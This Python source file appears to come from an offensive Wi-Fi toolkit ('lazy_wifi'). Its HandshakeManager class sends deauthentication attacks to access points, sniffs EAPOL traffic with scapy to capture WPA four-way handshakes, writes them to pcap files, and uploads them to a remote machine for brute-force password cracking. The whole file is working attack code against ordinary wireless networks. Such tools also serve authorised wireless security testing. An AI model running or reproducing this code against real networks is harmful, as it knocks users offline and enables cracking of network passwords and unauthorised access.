from pathlib import Path
from threading import Event

import pandas
from scapy.contrib.wpa_eapol import WPA_key
from scapy.sendrecv import sniff
from scapy.utils import wrpcap

from lazy_wifi.class_exceptions.exceptions import LazyWifiException
from lazy_wifi.context_manager.context import Context
from lazy_wifi.src.deauth_attack import DeauthAttacker
from lazy_wifi.src.remote_connection import RemoteConnection
from lazy_wifi.src.utils import print_status, print_message, print_alert


class HandshakeManager:

    def __init__(self, networks: pandas.DataFrame, context: Context):
        self.context = context
        self.interface_handle = self.context.main_interface
        self.networks_df = networks
        self.stop_sniff = Event()
        self.bssid = None
        self.ssid = None
        self.channel = None
        self.processes = []
        self.wpa_handshakes = {}
        self.handshake_counter = 0
        self.sent_to_cracking = []
        self.deauth_attacker = DeauthAttacker(self.interface_handle, self.context)

    def gather_handshakes(self):
        """
            Manages and gathers as many handshakes as possible from targeted networks
        """
        try:
            for ap_mac_addr in self.networks_df.index:
                self.ssid = self.networks_df['ESSID'][ap_mac_addr]
                # Check whether specific targets were specified, if not go through entire data frame
                if self.ssid:  # Validate that were not attacking an empty SSID
                    if self.context.target_ssid_list:
                        if self.ssid in self.context.target_ssid_list:
                            self._capture_handshake(ap_mac_addr)
                    else:
                        self._capture_handshake(ap_mac_addr)
        except (KeyboardInterrupt, SystemExit):
            raise LazyWifiException

    def _capture_handshake(self, ap_mac_addr: str):
        """
            Sends deauth attack to access point and sniffs EAPOL packets in the network

            :param ap_mac_addr: Access point mac addr
        """
        try:
            self.channel = self.networks_df['CHANNEL'][ap_mac_addr]
            self.bssid = ap_mac_addr
            print_alert(f"Sending deauth attack on ESSID: {self.ssid} BSSID: {self.bssid}")
            self.context.main_logger.info(f"Sending deauth attack on ESSID: {self.ssid} BSSID: {self.bssid}")
            self.deauth_attacker.threaded_deauth_attack(self.channel, access_point_addr=self.bssid)
            self._sniff_handshakes()
        except (KeyboardInterrupt, SystemExit):
            raise LazyWifiException

    def _handle_eapol(self, eapol_packet):
        """
            Handles eapol packets and waits for 3/4 Auth handshakes packets to be received

            :param eapol_packet:  packet sniffed from scapy sniff() function
        """
        _WPA_KEY_INFO_INSTALL = 64
        _WPA_KEY_INFO_ACK = 128
        _WPA_KEY_INFO_MIC = 256

        layer = eapol_packet.getlayer(WPA_key)
        if eapol_packet.FCfield & 1:
            current_client_mac_addr = eapol_packet.addr2
        elif eapol_packet.FCfield & 2:
            current_client_mac_addr = eapol_packet.addr1
        else:
            return

        if current_client_mac_addr not in self.wpa_handshakes:
            fields = {
                'frame2': None,
                'frame3': None,
                'frame4': None,
                'replay_counter': None,
                'packets': []
            }
            self.wpa_handshakes[current_client_mac_addr] = fields

        key_info = layer.key_info
        wpa_key_length = layer.wpa_key_length
        replay_counter = layer.replay_counter

        # Check for frame 2
        if ((key_info & _WPA_KEY_INFO_MIC) and
                (key_info & _WPA_KEY_INFO_ACK == 0) and
                (key_info & _WPA_KEY_INFO_INSTALL == 0) and
                (wpa_key_length > 0)):
            self._handle_handshake_packet(2, current_client_mac_addr, eapol_packet)

        # Check for frame 3
        if ((key_info & _WPA_KEY_INFO_MIC) and
                (key_info & _WPA_KEY_INFO_ACK) and
                (key_info & _WPA_KEY_INFO_INSTALL)):
            self.wpa_handshakes[current_client_mac_addr]['replay_counter'] = replay_counter
            self._handle_handshake_packet(3, current_client_mac_addr, eapol_packet)

        # Check for frame 4
        if ((key_info & _WPA_KEY_INFO_MIC) and
                (key_info & _WPA_KEY_INFO_ACK == 0) and
                (key_info & _WPA_KEY_INFO_INSTALL == 0) and
                self.wpa_handshakes[current_client_mac_addr]['replay_counter'] == replay_counter):
            self._handle_handshake_packet(4, current_client_mac_addr, eapol_packet)

        # Save final handshake
        if (self.wpa_handshakes[current_client_mac_addr]['frame2'] and
                self.wpa_handshakes[current_client_mac_addr]['frame3'] and
                self.wpa_handshakes[current_client_mac_addr]['frame4']):
            self._handle_final_handshake(current_client_mac_addr, eapol_packet)

    def _handle_handshake_packet(self, packet_num, client_mac_addr, eapol_packet):
        """
            Handles every packet from the handshake

            :param packet_num: Packet number in 4 way handshake
            :param client_mac_addr: Target mac address
            :param eapol_packet: Packet captured from scapy sniff()
        """
        print(f"Found packet {packet_num} for {client_mac_addr}")
        self.wpa_handshakes[client_mac_addr][f'frame{packet_num}'] = 1
        self.wpa_handshakes[client_mac_addr]['packets'].append(eapol_packet)

    def _handle_final_handshake(self, client_mac_addr, last_packet):
        """
            Saves the final handshake to pcap file in specified directory

            :param client_mac_addr: Captured target mac address
            :param last_packet: Last eapol packet to add to pcap file
        """
        print("Handshake found!")
        self.handshake_counter += 1
        # Make sure file is with no blank spaces
        filename = self.ssid.replace(" ", "")
        full_path = Path(self.context.saved_pcap_files_directory, f'{filename}.pcap').absolute()
        try:
            self.wpa_handshakes[client_mac_addr]['packets'].append(last_packet)
            if self.ssid not in self.sent_to_cracking:
                # Save pcap file locally
                wrpcap(f'{full_path}', self.wpa_handshakes[client_mac_addr]['packets'])
                self.context.main_logger.info(f'Captured handshake for target {client_mac_addr}')
                if self.context.remote_machine_available:
                    # Upload pcap file to remote machine
                    self._send_handshake_to_remote_machine(full_path)
                    self.sent_to_cracking.append(self.ssid)
        except FileNotFoundError as e:
            self.context.main_logger.error(f'Error writing handshake to file: {e}')

    def _send_handshake_to_remote_machine(self, filename: str):
        """
            Uploads the captured pcap file to the remote machine

            :param filename: Captured EAPOL file name
        """
        with RemoteConnection(self.context) as connection:
            if connection:
                connection.start_brute_force_on_file(filename, self.ssid)

    def _handle_handshake_packets(self, pkt):
        if pkt.haslayer(WPA_key):
            self._handle_eapol(pkt)

    def _sniff_handshakes(self):
        print_status(f"Starting sniffing on channel: {self.channel} for ESSID: {self.ssid}")

        sniff(iface=self.interface_handle.dev, prn=self._handle_handshake_packets,
              timeout=self.context.handshake_scan_time)
        print_message(f"Total handshakes found: {self.handshake_counter}")
        # Start the count all over again
        self.handshake_counter = 0
